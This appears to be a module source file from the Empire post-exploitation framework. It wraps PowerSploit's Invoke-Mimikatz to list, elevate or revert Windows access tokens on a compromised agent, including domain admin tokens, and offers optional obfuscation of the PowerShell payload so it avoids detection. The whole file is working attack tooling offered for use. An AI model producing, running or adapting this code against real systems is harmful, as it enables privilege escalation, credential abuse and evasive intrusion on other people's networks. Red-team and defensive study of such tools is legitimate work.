from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Mimikatz Tokens',

            'Author': ['@JosephBialek', '@gentilkiwi'],

            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                            "to list or enumerate tokens."),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'http://clymb3r.wordpress.com/',
                'http://blog.gentilkiwi.com'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'list' : {
                'Description'   :   'Switch. List current tokens on the machine.',
                'Required'      :   False,
                'Value'         :   'True'
            },
            'elevate' : {
                'Description'   :   'Switch. Elevate instead of listing tokens.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'revert' : {
                'Description'   :   'Switch. Revert process token.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'admin' : {
                'Description'   :   'Switch. List/elevate local admin tokens.',
                'Required'      :   False,
                'Value'         :   ''
            },  
            'domainadmin' : {
                'Description'   :   'Switch. List/elevate domain admin tokens.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'user' : {
                'Description'   :   'User name to list/elevate the token of.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'id' : {
                'Description'   :   'Token ID to list/elevate the token of.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        listTokens = self.options['list']['Value']        
        elevate = self.options['elevate']['Value']
        revert = self.options['revert']['Value']
        admin = self.options['admin']['Value']
        domainadmin = self.options['domainadmin']['Value']
        user = self.options['user']['Value']
        processid = self.options['id']['Value']

        script = moduleCode

        scriptEnd = "Invoke-Mimikatz -Command "

        if revert.lower() == "true":
            scriptEnd += "'\"token::revert"
        else:
            if listTokens.lower() == "true":
                scriptEnd += "'\"token::list"
            elif elevate.lower() == "true":
                scriptEnd += "'\"token::elevate"
            else:
                print helpers.color("[!] list, elevate, or revert must be specified!")
                return ""

            if domainadmin.lower() == "true":
                scriptEnd += " /domainadmin"
            elif admin.lower() == "true":
                scriptEnd += " /admin"
            elif user.lower() != "":
                scriptEnd += " /user:" + str(user)
            elif processid.lower() != "":
                scriptEnd += " /id:" + str(processid)

        scriptEnd += "\"';"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
